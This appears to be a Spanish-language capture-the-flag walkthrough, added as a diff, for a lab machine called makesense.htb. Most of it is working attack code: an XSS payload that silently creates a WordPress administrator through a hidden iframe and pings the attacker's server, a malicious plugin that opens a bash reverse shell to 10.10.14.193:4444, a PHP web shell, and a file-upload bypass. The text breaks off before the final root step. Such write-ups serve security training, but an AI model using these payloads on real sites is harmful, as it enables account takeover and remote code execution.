@@ -1,0 +1,91 @@
+* con burpsuite enumera toda la pagina encotraras que hace peticiones al subir un audio
+  https://makesense.htb/wp-content/uploads/2026/
+* este enpoint filtra informacion, en carpeta 01 encontrarás lo un audio de jake que describe la contraseña
+* sube este audio a una pagina que convierta audio a texto y encuentra la contraseña
+ jake - ClearLightNiceSmooth4923
+
+* al parecer no es necesario entrar como jake, esta es solo la pista que necesitas para saber que existe en XSS. abusemos ahora del XSS
+
+crea un payload.js
+
+++++++ File
+
+(function() {
+// 1. Cargar la página de crear usuario en un iframe
+const iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+iframe.src = '/wp-admin/user-new.php';
+document.body.appendChild(iframe);
+
+iframe.onload = function() {
+    try {
+        const doc = iframe.contentDocument;
+
+        // 2. Rellenar los campos del formulario
+        doc.querySelector('#user_login').value = 'pwned_admin';
+        doc.querySelector('#email').value = 'pwned@example.com';
+        doc.querySelector('#pass1').value = 'P@ssw0rd123!';
+        doc.querySelector('#pass2').value = 'P@ssw0rd123!';
+
+        // 3. Seleccionar el rol de Administrador
+        const roleSelect = doc.querySelector('#role');
+        if (roleSelect) {
+            roleSelect.value = 'administrator';
+        }
+
+        // 4. Buscar y hacer clic en el botón de crear usuario
+        const submitButton = doc.querySelector('#createusersub');
+        if (submitButton) {
+            submitButton.click();
+            // 5. (Opcional) Notificar a tu servidor C2 que el usuario fue creado
+            new Image().src = 'http://<TU-IP>:8000/log?type=new_user&data=created';
+		return;
+        }
+    } catch(e) {
+        // Manejar errores silenciosamente
+    }
+};
+})();
+
+++++++ EOF
+
+* despues mete el CDN en el apartado message de texto :
+
+  <script src="http://10.10.14.193:8000/payload.js"></script>
+
+* Cuando el bot de admin entre al apartado, creara un usuario admin para ti, con la contraseña seleccionada en el payload y te avisará. 
+
+* Ahora con el usuario admin añade crea payload.php y comprimelo en payload.zip, subelo y actialo para ganar una rev
+
+++++++ FILE payload.php +++++
+
+<?php
+/**
+ * Plugin Name: payload
+ * Description: Muestra "¡Hola Mundo!" en el header.
+ * Version:     1.0.0
+ */
+
+if ( ! defined( 'ABSPATH' ) ) exit;
+
+add_action( 'wp_body_open', function () {
+    echo "<p>black charro saluda</p>";
+    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.193/4444 0>&1'");
+} );
+
+++++++ EOF +++++++
+
+ * una vez dentro, enumera el archvo de configuracion de worpress, entcotraras una contraseña de mysql que no se usa pero es la contraseña de walter 
+
+
+ * puedes usar ss para buscar otros sitios web, encontraras el 8001
+
+ * Usa el usuario y la contraseña de walter para entrar a esa nueva pagina
+
+ * crea una imagen usando https://www.imagetotext.info/text-to-image de la revshell <?php system($_GET['cmd']); ?>
+
+ * deten con burpsuite el envio de la imagen b64 y reemplazalo por la imagen b64 generada con 'cat rev.png | base64 -w 0 | xargs urlencode' y reemplazalo
+
+ * ponle el nombre de rev.php y listo entra a ip:/saved/rev.php?c='id'
+
+ * Obtengamos la root.txt con el comando
